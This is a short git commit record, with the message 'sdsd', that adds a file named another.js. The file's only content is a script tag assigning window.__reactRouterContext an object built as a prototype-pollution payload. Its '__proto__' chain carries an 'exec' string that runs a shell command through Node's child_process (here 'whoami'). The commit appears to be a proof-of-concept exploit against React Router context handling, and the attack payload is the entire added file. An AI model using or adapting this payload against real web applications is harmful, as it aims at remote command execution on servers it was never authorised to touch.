ba2d2ff431cd4a84d4c6d64874f6ab33a61bfbf7
Abderafie Chairi <chairi.abderafie@gmail.com>
2026-07-03 17:11:06 +0100

    sdsd

---
+++ another.js
@@ -0,0 +1,3 @@
+<script>
+  window.__reactRouterContext = {"__proto__":{"constructor":{"prototype":{"exec":"require('child_process').execSync('whoami').toString()"}}},"loaderData":{},"status":200};
+</script>
